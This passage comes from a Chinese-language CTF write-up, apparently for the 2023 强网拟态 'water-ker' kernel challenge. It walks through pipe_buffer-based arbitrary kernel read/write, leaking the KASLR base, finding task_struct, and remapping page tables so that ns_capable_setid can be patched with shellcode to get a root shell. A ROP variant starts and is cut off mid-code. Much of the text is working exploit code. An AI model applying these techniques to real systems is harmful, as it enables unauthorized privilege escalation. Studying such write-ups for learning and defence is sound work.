title="uaf"><ul><li><p>self-pointing：要达成任意页读写首先我们要能够更改page指针，要更改page指针就要知道pipe_buffer地址再让page指向pipe_buffer……听起来很像死循环(ˉ▽ˉ；)…</p><p>但由于我们已经泄露了一个page地址，所以让这个page上的pipe_buffer-&gt;page指向自己就能解决以上问题</p></li><li><p>三个pipe的更改类似于一个这样的循环</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E5%BE%AA%E7%8E%AF.png" class title="循环"><ul><li>首先需要一个更改pipe1-&gt;page的pipe3</li><li>还需要一个将pipe3复原的pipe2</li><li>pipe2还需要复原（又双叒叕循环了(ˉ▽ˉ；)…），由于pipe3处于高物理地址处所以可以一口气完成更改pipe1和pipe2的任务</li></ul></li><li><p>所以大概一个过程就是</p><ul><li>pipe2复原pipe3</li><li>pipe3更改pipe1指向要读写的page</li><li>pipe3复原pipe2</li></ul></li></ul><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>需要获得两个基址：vmemmap基址和kernel基址</p><ul><li><p>vmemmap</p><ul><li>在内存大于1G时，KASLR的粒度是256MB（0x10000000），我们可以通过存在物理地址physmem_base + 0x9d000（vmemmap[157]）处的secondary_startup_64函数指针判断是否找到了kernel基址</li><li>由于我们之前已经有了一个page的地址，我们可以先将这个page的地址256MB对齐作为vmemmap基址，如果vmemmap[157]处有secondary_startup_64函数指针则基址正确，否则vmemmap-&#x3D;256MB，继续</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> *comm_addr;<br>  <br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>setup_evil_pipe();<br>  <br>vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br>  <br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0xe0</span>)) &#123;<br>        kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0xe0</span>;<br>        kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>               kernel_base, kernel_offset);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  <br>    vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br></code></pre></td></tr></table></figure><p><em>ps：关于kaslr的所有内容都是根据注释来的，不清楚原理，感觉要研究原理又要开始系统启动了捏~(￣▽￣)~*</em></p></li><li><p>current task_struct</p><ul><li><p>task_struct结构体有一个comm成员会记录进程的名称，是一个十六字节的字符数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-type">char</span>comm[<span class="hljs-number">16</span>];<span class="hljs-comment">/*  2960    16 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>prctl系统调用可以修改进程的名称，这个进程名之后会作为内存搜索的目标来定位task_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br>    <br>prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>搜索comm，并根据comm定位task_struct，task_struct的ptraced指针是指向自己的，这样我们就能获取task_struct的地址</p><p>因为task_struct是存在直接映射区（heap）上的，且在内存小于256M时heap_base &#x3D; heap_leak &amp; 0xfffffffff0000000，这样我们就能获得直接heap基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br><br>    comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>    <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br>    <br>        <span class="hljs-comment">/* task-&gt;read_parent */</span><br>        parent_task = comm_addr[<span class="hljs-number">-61</span>];<br>    <br>        <span class="hljs-comment">/* task_struct::ptraced */</span><br>        current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br>    <br>        page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>        page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br>    <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>               (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>               page_offset_base);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>               <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>三种提权方法</p><h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>考虑直接更改内核代码段(○´･д･)ﾉ</p><p>但直接映射区对应的代码段区域没有w权限，直接写入会造成kernel panic</p><p>改写代码段本质上是向对应的物理页写入数据，上文我们已经获得了task_struct的地址，我们可以考虑更改进程页表建立一个到内核代码段的映射，这样就能改写了：）</p><p>方便起见先mmap一段地址，再改写这段地址的页表，这就是usma \ ^o^ &#x2F;</p><ul><li><p>先说明一下这个地址转换函数direct_map_addr_to_page_addr，用于将直接映射区的地址转化为所属页的page结构体地址（page_offset_base是直接映射区基址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>先调用pgd_vaddr_resolve找页表地址</p><ul><li><p>从task_struct所在页读取内容（读两页），并获取mm和stack的地址，定位mm_struct所在的页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br>    <br><span class="hljs-comment">/* read current task_struct */</span><br>current_task_page = direct_map_addr_to_page_addr(current_task);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br>    <br>tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>stack_addr = tsk_buf[<span class="hljs-number">4</span>] + <span class="hljs-number">0x3000</span>;<br>mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br>    <br>mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br></code></pre></td></tr></table></figure></li><li><p>读mm_struct，定位页表pgd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* read mm_struct */</span><br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br>    <br>mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br>    <br><span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>mmap一段内存并且先往里面写点东西，因为mmap不会先分配内存页，第一次写入才会分配内存页，需要两页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810eab50</span><br>  <br><span class="hljs-type">char</span> *kcode_map, *kcode_func;<br><span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br>  <br>kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                 MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>&#125;<br>  <br><span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>    kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>要更改的目标函数是ns_capable_setid，这里计算的是虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>       dst_vaddr);<br></code></pre></td></tr></table></figure></li><li><p>接下来就是调用vaddr_resolve_for_3_level查找ns_capable_setid对应的页表项，因为进程的页表也映射了内核空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br></code></pre></td></tr></table></figure><ul><li><p>先看一些与页表有关的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br></code></pre></td></tr></table></figure><p>由于PDE的PS位置一，所以PDE直接映射到2M的页，其实只有三级页表，放一张四级页表的图意思一下：）</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E9%A1%B5%E8%A1%A8.png" class title="页表"></li><li><p>vaddr_resolve_for_3_level返回目标虚拟地址的物理地址</p><p>对于每级页表</p><ul><li>先读取内容，读一页</li><li>根据虚拟地址对应位数查找下一级页表的地址，还要去除低位和高位的标志位</li><li>以上得出的是物理地址，加直接映射区基址转化为虚拟地址</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>pud_addr += page_offset_base;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>pmd_addr += page_offset_base;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br><span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>计算ns_capable_setid所在的小页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br></code></pre></td></tr></table></figure></li><li><p>调用vaddr_remapping把mmap映射的物理地址改为ns_capable_setid，改两页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remapping to our mmap area */</span><br>vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br></code></pre></td></tr></table></figure><ul><li><p>这里的PDE的PS位没有置一，所以是四级页表，思路和vaddr_resolve_for_3_level一样，多一步寻表和更改，更改处还要将页置为可写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>开始更改目标函数ns_capable_setid</p><p>setresuid系统调用中会调用ns_capable_setid判断user的权限，直接patch ns_capable_setid使它永远return true：）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <br>        <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>        <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>        <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>        <span class="hljs-number">12</span>);<br></code></pre></td></tr></table></figure></li><li><p>调用setresuid更改用户id，提权拿shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* get root now :) */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br>  <br>sleep(<span class="hljs-number">5</span>);<br>  <br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>get_root_shell();<br></code></pre></td></tr></table></figure></li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>通过task_struct找内核栈地址所在page，直接在内核栈上写rop链</p><ul><li><p>还是调用pgd_vaddr_resolve获取一些地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>redo:<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br></code></pre></td></tr></table></figure></li><li><p>获取stack的内核虚拟地址（task_struct的task成员就是内核栈地址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>stack_addr_another += page_offset_base;<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br></code></pre></td></tr></table></figure><p>vaddr_resolve函数和vaddr_resolve_for_3_level差不多，只是多一层解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> 